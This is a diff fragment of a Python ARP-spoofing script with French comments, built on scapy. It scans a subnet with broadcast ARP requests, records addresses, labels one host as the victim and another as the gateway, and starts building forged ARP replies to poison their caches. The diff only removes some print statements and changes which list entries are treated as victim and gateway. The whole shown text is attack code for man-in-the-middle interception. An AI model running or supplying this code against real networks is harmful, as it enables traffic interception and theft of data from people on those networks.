@@ -16,15 +16,12 @@ def ARP_Spoof(Network = str):
     ans= scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = Network), timeout = 2, inter = 0.1)[0]
     # Scan ARP pour récupérer les adresses
     
-    print ("\n[*] IP - MAC") 
 
     for i in range(len(ans)): # Stock des adresses MAC et IP
         MAC.append(ans[i][0].hwsrc)
         IP.append(ans[i][0].psrc)
 
-    print("\n[*] Scan fini" + "\n[*] Résultat :" + "\n ADRESSES MAC :", MAC + "\n ADRESSES IP :", IP )
-
-    print("[*]VICTIME : Adresse Mac ",MAC[1],", IP  ",IP[1],"\n [*]GATEWAY : Adresse Mac ",MAC[2]," IP ",IP[2])
+    print("[*]VICTIME : Adresse Mac ",MAC[0],", IP  ",IP[0],"\n [*]GATEWAY : Adresse Mac ",MAC[1]," IP ",IP[1])
     
     def spoof(ip_1 , ip_2): 
         packet = scapy.ARP(op = 2, pdst = ip_1, hwdst = MAC[1], psrc = ip_2)
